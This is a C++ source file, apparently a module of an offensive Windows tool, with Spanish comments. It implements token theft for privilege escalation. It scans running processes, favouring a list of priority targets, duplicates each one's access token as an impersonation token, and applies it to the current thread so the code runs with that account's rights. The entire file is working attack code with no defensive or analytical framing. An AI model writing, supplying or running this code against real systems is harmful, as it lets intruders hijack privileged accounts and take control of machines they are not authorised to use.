#include "privilege_escalation\TokenTheft.h"
#include "Utils.h"

TokenTheft::TokenTheft() : hProcessSnapshot(INVALID_HANDLE_VALUE) {
	hProcessSnapshot = Recon::getProcessSnapshot();

	if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
		std::cerr << "Error al obtener el snapshot de procesos." << std::endl;
	}
}

BOOL TokenTheft::StartImpersonation() {
	return _TryImpersonateByPriorityProcesses() || _TryImpersonateBySnapshot();
}

BOOL TokenTheft::_TryImpersonateByPriorityProcesses() {
	for (const auto& processName : priorityProcesses) {
		std::wstring processName_wstr = Utils::StringToWstring(processName);

		if (_TryImpersonateByName(processName_wstr)) {
			return TRUE;
		}
	}

	return FALSE;
}

BOOL TokenTheft::_TryImpersonateByName(const std::wstring& processName) {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnapshot, &pe32)) {
		do {
			if (processName == pe32.szExeFile) {
				return _DuplicateTokenByProcessID(pe32.th32ProcessID);
			}
		} while (Process32Next(hProcessSnapshot, &pe32));
	}
	return FALSE;
}

BOOL TokenTheft::_DuplicateTokenByProcessID(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID);
    if (hProcess == NULL) {
        std::cerr << "No se pudo abrir el proceso con PID: " << processID << ". Código de error: " << GetLastError() << std::endl;
        return FALSE;
    }

    HANDLE hToken;
    BOOL result = FALSE;
    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        HANDLE hDupToken;
        // Cambiar a TokenImpersonation
        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
            std::wcout << L"Token duplicado exitosamente para PID: " << processID << std::endl;

            // Intentar establecer el token duplicado en el hilo actual
            if (SetThreadToken(NULL, hDupToken)) {
                std::wcout << L"Suplantación exitosa para el hilo actual usando el token duplicado." << std::endl;
                result = TRUE;  // Marcar el proceso como exitoso
            }
            else {
                DWORD error = GetLastError();  // Obtener el código de error
                std::cerr << "Error al establecer el token duplicado en el hilo actual. Código de error: " << error << std::endl;

                // Convertir el código de error a un mensaje de error legible
                LPVOID errorMsg;
                if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                    NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                    (LPWSTR)&errorMsg, 0, NULL)) {
                    std::wcerr << L"Detalles del error: " << (LPWSTR)errorMsg << std::endl;
                    LocalFree(errorMsg);  // Liberar la memoria asignada por FormatMessage
                }
            }

            // Cerrar el token duplicado después de aplicarlo
            CloseHandle(hDupToken);
        }
        else {
            std::cerr << "Error al duplicar el token para el proceso con PID: " << processID << ". Código de error: " << GetLastError() << std::endl;
        }
        CloseHandle(hToken);  // Cerrar el token del proceso original
    }
    else {
        std::cerr << "No se pudo obtener el token para el proceso con PID: " << processID << ". Código de error: " << GetLastError() << std::endl;
    }

    CloseHandle(hProcess);  // Cerrar el *handle* del proceso
    return result;
}

BOOL TokenTheft::_TryImpersonateBySnapshot() {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnapshot, &pe32)) {
		do {
			if (_DuplicateTokenByProcessID(pe32.th32ProcessID)) {
				std::wcout << L"Suplantación exitosa por snapshot en PID: " << pe32.th32ProcessID << std::endl;
				return TRUE;
			}
		} while (Process32Next(hProcessSnapshot, &pe32));
	}

	return FALSE;
}

TokenTheft::~TokenTheft() {
	if (hProcessSnapshot && hProcessSnapshot != INVALID_HANDLE_VALUE) {
		CloseHandle(hProcessSnapshot);
	}
}
